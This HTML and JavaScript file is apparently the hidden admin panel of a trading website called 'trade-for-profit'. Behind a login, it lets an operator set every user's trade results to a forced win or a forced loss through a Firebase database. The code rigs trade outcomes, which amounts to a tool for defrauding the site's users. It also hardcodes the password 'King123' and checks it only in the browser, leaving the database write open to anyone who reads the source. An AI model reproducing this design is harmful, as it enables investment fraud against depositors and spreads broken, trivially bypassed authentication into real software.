<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Master Control</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center h-screen">

    <div id="loginBox" class="bg-gray-800 p-8 rounded-2xl border border-yellow-500/20 text-center shadow-2xl">
        <h2 class="text-xl font-bold text-yellow-500 mb-6 uppercase tracking-widest">Admin Access</h2>
        <input type="password" id="passInput" class="bg-black p-4 rounded-xl text-white mb-4 w-full text-center border border-gray-700" placeholder="Enter Secret Key">
        <button onclick="checkPass()" class="bg-yellow-500 text-black w-full p-4 rounded-xl font-bold hover:bg-yellow-400">UNLOCK PANEL</button>
    </div>

    <div id="adminPanel" class="hidden w-full max-w-md p-5">
        <h1 class="text-2xl font-bold text-yellow-500 mb-6 text-center italic uppercase">Master Control Panel</h1>
        
        <div class="bg-gray-800 p-6 rounded-2xl border border-white/5 mb-6 text-center">
            <h3 class="text-xs text-gray-500 uppercase mb-4">Set Global Trade Result</h3>
            <div class="flex gap-3">
                <button onclick="setMode('win')" class="flex-1 bg-green-600 p-4 rounded-xl font-bold shadow-lg shadow-green-900/20">FORCE WIN ✅</button>
                <button onclick="setMode('loss')" class="flex-1 bg-red-600 p-4 rounded-xl font-bold shadow-lg shadow-red-900/20">FORCE LOSS ❌</button>
            </div>
            <p id="st" class="mt-4 text-[10px] text-yellow-500 italic opacity-50 uppercase tracking-widest">Current Mode: Normal</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const db = getDatabase(initializeApp({ databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com/" }));

        window.checkPass = () => {
            const userKey = document.getElementById('passInput').value;
            if(userKey === "King123") { // <--- Yahan Password Hai "King123"
                document.getElementById('loginBox').classList.add('hidden');
                document.getElementById('adminPanel').classList.remove('hidden');
                loadStatus();
            } else { alert("Ghalat Password! Niklo Bahar."); }
        };

        window.setMode = (m) => {
            set(ref(db, 'admin/settings/mode'), m);
            alert("Mode set to: " + m.toUpperCase());
        };

        function loadStatus() {
            onValue(ref(db, 'admin/settings/mode'), (s) => {
                document.getElementById('st').innerText = "Current Mode: " + (s.val() || "Normal").toUpperCase();
            });
        }
    </script>
</body>
 
</html>
